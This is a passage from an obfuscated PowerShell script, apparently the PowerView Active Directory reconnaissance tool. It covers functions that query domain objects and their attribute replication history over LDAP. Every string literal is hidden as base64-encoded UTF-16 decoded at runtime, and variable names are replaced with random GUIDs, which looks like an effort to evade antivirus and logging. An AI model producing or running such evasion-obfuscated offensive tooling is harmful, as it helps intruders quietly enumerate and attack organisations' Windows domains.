('TgBPAFQAXwAkAF8A')))}
        New-DynamicParameter -Name UACFilter 
-ValidateSet ${166ef91acae049d6998dbeb4efc8e2e2} -Type ([array])
    
}
    BEGIN {
        ${ea43c787582f45539b7f519da4680c7a} = @{}
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
       
 if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${1a6b5ee3c98848d1af7a37453fb98664} = Get-DomainSearcher 
@ea43c787582f45539b7f519da4680c7a
    }
    PROCESS {
        if 
($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
         
   New-DynamicParameter -CreateVariables -BoundParameters 
$PSBoundParameters
        }
        if 
(${1a6b5ee3c98848d1af7a37453fb98664}) {
            
${987d1cda8c15450d8512978866836ba0} = ''
            $Filter = ''
     
       $Identity | Where-Object {$_} | ForEach-Object {
              
  ${0c2b6ec1d84e4c9188d4d73c607426d3} = $_.Replace('(', 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('XAAyADkA'))))
                if 
(${0c2b6ec1d84e4c9188d4d73c607426d3} -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBTAC0AMQAtAA==')))) {
                    
${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewAwAGMAMgBiADYAZQBjADEAZAA4ADQAZQ
A0AGMAOQAxADgAOABkADQAZAA3ADMAYwA2ADAANwA0ADIANgBkADMAfQApAA==')))
   
             }
                elseif 
(${0c2b6ec1d84e4c9188d4d73c607426d3} -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgAoAEMATgB8AE8AVQB8AEQAQwApAD0A')))) {
                    
${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAMABjADIAYg
A2AGUAYwAxAGQAOAA0AGUANABjADkAMQA4ADgAZAA0AGQANwAzAGMANgAwADcANAAyAD
YAZAAzAH0AKQA=')))
                    if ((-not $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        
${84423cbf5a544fd6aa05dc7201f84256} = 
${0c2b6ec1d84e4c9188d4d73c607426d3}.SubString
(${0c2b6ec1d84e4c9188d4d73c607426d3}.IndexOf
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
       
                 Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AF0AIABFAHgAdAByAGEAYw
B0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAHsAOAA0ADQAMgAzAGMAYgBmADUAYQA1AD
QANABmAGQANgBhAGEAMAA1AGQAYwA3ADIAMAAxAGYAOAA0ADIANQA2AH0AJwAgAGYAcg
BvAG0AIAAnACQAewAwAGMAMgBiADYAZQBjADEAZAA4ADQAZQA0AGMAOQAxADgAOABkAD
QAZAA3ADMAYwA2ADAANwA0ADIANgBkADMAfQAnAA==')))
                       
 ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = ${84423cbf5a544fd6aa05dc7201f84256}
        
                ${1a6b5ee3c98848d1af7a37453fb98664} = Get-
DomainSearcher @ea43c787582f45539b7f519da4680c7a
                     
   if (-not ${1a6b5ee3c98848d1af7a37453fb98664}) {
                   
         Write-Warning $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AF0AIABVAG4AYQBiAGwAZQ
AgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAGQAbwBtAGEAaQBuACAAcwBlAGEAcgBjAG
gAZQByACAAZgBvAHIAIAAnACQAewA4ADQANAAyADMAYwBiAGYANQBhADUANAA0AGYAZA
A2AGEAYQAwADUAZABjADcAMgAwADEAZgA4ADQAMgA1ADYAfQAnAA==')))
           
             }
                    }
                }
                
elseif (${0c2b6ec1d84e4c9188d4d73c607426d3} -imatch 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQ
AtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
            
        ${3e0cccb945b440b99b2100f08845f4a8} = 
(([Guid]${0c2b6ec1d84e4c9188d4d73c607426d3}).ToByteArray() | 
ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                 
   ${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7ADMAZQAwAGMAYwBjAGIAOQA0ADUAYg
A0ADQAMABiADkAOQBiADIAMQAwADAAZgAwADgAOAA0ADUAZgA0AGEAOAB9ACkA')))
   
             }
                elseif 
(${0c2b6ec1d84e4c9188d4d73c607426d3}.Contains('\')) {
                
    ${1a83f5c24b5141dcbf4cb4cd70c98c69} = 
${0c2b6ec1d84e4c9188d4d73c607426d3}.Replace
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XAAyADgA'))), '(').Replace($([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('XAAyADkA'))), ')') | Convert-ADName -
OutputType Canonical
                    if 
(${1a83f5c24b5141dcbf4cb4cd70c98c69}) {
                        
${2b613c69c9914277b8690836ef525a60} = 
${1a83f5c24b5141dcbf4cb4cd70c98c69}.SubString(0, 
${1a83f5c24b5141dcbf4cb4cd70c98c69}.IndexOf('/'))
                    
    $ObjectName = ${0c2b6ec1d84e4c9188d4d73c607426d3}.Split('\')[1]
  
                      ${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAE8AYgBqAGUAYwB0AE4AYQ
BtAGUAKQA=')))
                        
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = ${2b613c69c9914277b8690836ef525a60}
        
                Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AF0AIABFAHgAdAByAGEAYw
B0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAHsAMgBiADYAMQAzAGMANgA5AGMAOQA5AD
EANAAyADcANwBiADgANgA5ADAAOAAzADYAZQBmADUAMgA1AGEANgAwAH0AJwAgAGYAcg
BvAG0AIAAnACQAewAwAGMAMgBiADYAZQBjADEAZAA4ADQAZQA0AGMAOQAxADgAOABkAD
QAZAA3ADMAYwA2ADAANwA0ADIANgBkADMAfQAnAA==')))
                       
 ${1a6b5ee3c98848d1af7a37453fb98664} = Get-DomainSearcher 
@ea43c787582f45539b7f519da4680c7a
                    }
               
 }
                elseif 
(${0c2b6ec1d84e4c9188d4d73c607426d3}.Contains('.')) {
                
    ${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAB8ACgAcwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJAB7ADAAYwAyAGIANg
BlAGMAMQBkADgANABlADQAYwA5ADEAOAA4AGQANABkADcAMwBjADYAMAA3ADQAMgA2AG
QAMwB9ACkAKABuAGEAbQBlAD0AJAB7ADAAYwAyAGIANgBlAGMAMQBkADgANABlADQAYw
A5ADEAOAA4AGQANABkADcAMwBjADYAMAA3ADQAMgA2AGQAMwB9ACkAKABkAG4AcwBoAG
8AcwB0AG4AYQBtAGUAPQAkAHsAMABjADIAYgA2AGUAYwAxAGQAOAA0AGUANABjADkAMQ
A4ADgAZAA0AGQANwAzAGMANgAwADcANAAyADYAZAAzAH0AKQApAA==')))
           
     }
                else {
                    
${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAB8ACgAcwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJAB7ADAAYwAyAGIANg
BlAGMAMQBkADgANABlADQAYwA5ADEAOAA4AGQANABkADcAMwBjADYAMAA3ADQAMgA2AG
QAMwB9ACkAKABuAGEAbQBlAD0AJAB7ADAAYwAyAGIANgBlAGMAMQBkADgANABlADQAYw
A5ADEAOAA4AGQANABkADcAMwBjADYAMAA3ADQAMgA2AGQAMwB9ACkAKABkAGkAcwBwAG
wAYQB5AG4AYQBtAGUAPQAkAHsAMABjADIAYgA2AGUAYwAxAGQAOAA0AGUANABjADkAMQ
A4ADgAZAA0AGQANwAzAGMANgAwADcANAAyADYAZAAzAH0AKQApAA==')))
           
     }
            }
            if 
(${987d1cda8c15450d8512978866836ba0} -and 
(${987d1cda8c15450d8512978866836ba0}.Trim() -ne '') ) {
              
  $Filter += $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAB8ACQAewA5ADgANwBkADEAYwBkAGEAOABjADEANQA0ADUAMABkADgANQAxADIAOQ
A3ADgAOAA2ADYAOAAzADYAYgBhADAAfQApAA==')))
            }
            
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
   
             Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AF0AIABVAHMAaQBuAGcAIA
BhAGQAZABpAHQAaQBvAG4AYQBsACAATABEAEEAUAAgAGYAaQBsAHQAZQByADoAIAAkAE
wARABBAFAARgBpAGwAdABlAHIA')))
                $Filter += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            
$UACFilter | Where-Object {$_} | ForEach-Object {
                if 
($_ -match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TgBPAFQAXwAuACoA')))) {
                
    ${94bc4eae246742248efd06d55f760378} = $_.Substring(4)
            
        ${31f162691d5f4e939decf3286c312d49} = [Int]
(${9ad57110e7184c649f993e0b08059b53}::
${94bc4eae246742248efd06d55f760378})
                    $Filter += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAhACgAdQBzAGUAcgBBAGMAYwBvAHUAbgB0AEMAbwBuAHQAcgBvAGwAOgAxAC4AMg
AuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAkAHsAMwAxAG
YAMQA2ADIANgA5ADEAZAA1AGYANABlADkAMwA5AGQAZQBjAGYAMwAyADgANgBjADMAMQ
AyAGQANAA5AH0AKQApAA==')))
                }
                else {
    
                ${31f162691d5f4e939decf3286c312d49} = [Int]
(${9ad57110e7184c649f993e0b08059b53}::$_)
                    $Filter 
+= $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOA
A0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ACQAewAzADEAZgAxAD
YAMgA2ADkAMQBkADUAZgA0AGUAOQAzADkAZABlAGMAZgAzADIAOAA2AGMAMwAxADIAZA
A0ADkAfQApAA==')))
                }
            }
            if 
($Filter -and $Filter -ne '') {
                
${1a6b5ee3c98848d1af7a37453fb98664}.filter = 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAmACQARgBpAGwAdABlAHIAKQA=')))
            }
            Write-
Verbose "[Get-DomainObject] Get-DomainObject filter string: 
$(${1a6b5ee3c98848d1af7a37453fb98664}.filter)"
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { 
${9f78951ba80c437e9db41515f07bc24e} = 
${1a6b5ee3c98848d1af7a37453fb98664}.FindOne() }
            else { 
${9f78951ba80c437e9db41515f07bc24e} = 
${1a6b5ee3c98848d1af7a37453fb98664}.FindAll() }
            
${9f78951ba80c437e9db41515f07bc24e} | Where-Object {$_} | ForEach-
Object {
                if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBhAHcA')))]) {
                    $Object = $_
                   
 $Object.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBBAEQATwBiAGoAZQBjAHQALgBSAGEAdwA='))))
  
              }
                else {
                    $Object = 
Convert-LDAPProperty -Properties $_.Properties
                    
$Object.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBBAEQATwBiAGoAZQBjAHQA'))))
              
  }
                $Object
            }
            if 
(${9f78951ba80c437e9db41515f07bc24e}) {
                try { 
${9f78951ba80c437e9db41515f07bc24e}.dispose() }
                catch 
{
                    Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AF0AIABFAHIAcgBvAHIAIA
BkAGkAcwBwAG8AcwBpAG4AZwAgAG8AZgAgAHQAaABlACAAUgBlAHMAdQBsAHQAcwAgAG
8AYgBqAGUAYwB0ADoAIAAkAF8A')))
                }
            }
         
   ${1a6b5ee3c98848d1af7a37453fb98664}.dispose()
        }
    }
}
function Get-DomainObjectAttributeHistory {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType
('PowerView.ADObjectAttributeHistory')]
    [CmdletBinding()]
    
Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias
('DistinguishedName', 'SamAccountName', 'Name', 
'MemberDistinguishedName', 'MemberName')]
        [String[]]
        
$Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        
$Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
  
      [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty
()]
        [String[]]
        $Properties,
        
[ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        
[String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
       
 [Alias('DomainController')]
        [String]
        $Server,
        
[ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        
$SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        
[Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 
10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        
$Tombstone,
        [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty,
        [Switch]
        
$Raw
    )
    BEGIN {
        ${ea43c787582f45539b7f519da4680c7a} = @
{
            'Properties'    =   
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bQBzAGQAcwAtAHIAZQBwAGwAYQB0AHQAcgBpAGIAdQB0AGUAbQBlAHQAYQBkAGEAdA
BhAA=='))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            
'Raw'           =   $True
        }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) { ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RgBpAG4AZABPAG4AZQA=')))] = $FindOne }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
   
         ${2a9e3fd98d53462a8a6c61a7aa3c4690} = $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))] -Join '|'
        }
        else 
{
            ${2a9e3fd98d53462a8a6c61a7aa3c4690} = ''
        }
    }
  
  PROCESS {
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        Get-
DomainObject @ea43c787582f45539b7f519da4680c7a | ForEach-Object {
    
        ${77ca87db65af46af91551f70812dbd42} = $_.Properties
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))][0]
           
 ForEach(${29cab85d1ee44f039de259a44977e71b} in $_.Properties
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bQBzAGQAcwAtAHIAZQBwAGwAYQB0AHQAcgBpAGIAdQB0AGUAbQBlAHQAYQBkAGEAdA
BhAA==')))]) {
                ${7cfbc7ec307942fab976714e4e1c9453} = 
[xml]${29cab85d1ee44f039de259a44977e71b} | Select-Object -
ExpandProperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('RABTAF8AUgBFAFAATABfAEEAVABUAFIAXwBNAEUAVABBAF8ARABBAFQAQQA='))) 
-ErrorAction SilentlyContinue
                if 
(${7cfbc7ec307942fab976714e4e1c9453}) {
                    if 
(${7cfbc7ec307942fab976714e4e1c9453}.pszAttributeName -Match 
${2a9e3fd98d53462a8a6c61a7aa3c4690}) {
                        
${5cfffc0ad0f94214bae0585e8079600f} = New-Object PSObject
            
            ${5cfffc0ad0f94214bae0585e8079600f} | Add-Member 
NoteProperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) 
${77ca87db65af46af91551f70812dbd42}
                        
${5cfffc0ad0f94214bae0585e8079600f} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQB0AHQAcgBpAGIAdQB0AGUATgBhAG0AZQA='))) 
${7cfbc7ec307942fab976714e4e1c9453}.pszAttributeName
                 
       ${5cfffc0ad0f94214bae0585e8079600f} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcAQwBoAGEAbgBnAGUA'))) 
${7cfbc7ec307942fab976714e4e1c9453}.ftimeLastOriginatingChange
       
                 ${5cfffc0ad0f94214bae0585e8079600f} | Add-Member 
NoteProperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 
${7cfbc7ec307942fab976714e4e1c9453}.dwVersion
                        
${5cfffc0ad0f94214bae0585e8079600f} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcARABzAGEARABOAA=='))) 
${7cfbc7ec307942fab976714e4e1c9453}.pszLastOriginatingDsaDN
          
              
${5cfffc0ad0f94214bae0585e8079600f}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBBAEQATwBiAGoAZQBjAHQAQQB0AHQAcgBpAGIAdQ
B0AGUASABpAHMAdABvAHIAeQA='))))
                        
${5cfffc0ad0f94214bae0585e8079600f}
                    }
             
   }
                else {
                    Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEEAdAB0AHIAaQBiAHUAdA
BlAEgAaQBzAHQAbwByAHkAXQAgAEUAcgByAG8AcgAgAHIAZQB0AHIAaQBlAHYAaQBuAG
cAIAAnAG0AcwBkAHMALQByAGUAcABsAGEAdAB0AHIAaQBiAHUAdABlAG0AZQB0AGEAZA
BhAHQAYQAnACAAZgBvAHIAIAAnACQAewA3ADcAYwBhADgANwBkAGIANgA1AGEAZgA0AD
YAYQBmADkAMQA1ADUAMQBmADcAMAA4ADEAMgBkAGIAZAA0ADIAfQAnAA==')))
       
         }
            }
        }
    }
}
function Get-
DomainObjectLinkedAttributeHistory {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType
('PowerView.ADObjectLinkedAttributeHistory')]
    [CmdletBinding()]
   
 Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias
('DistinguishedName', 'SamAccountName', 'Name', 
'MemberDistinguishedName', 'MemberName')]
        [String[]]
        
$Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        
$Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
  
      [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty
()]
        [String[]]
        $Properties,
        
[ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        
[String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
       
 [Alias('DomainController')]
        [String]
        $Server,
        
[ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        
$SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        
[Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 
10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        
$Tombstone,
        [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty,
        [Switch]
        
$Raw
    )
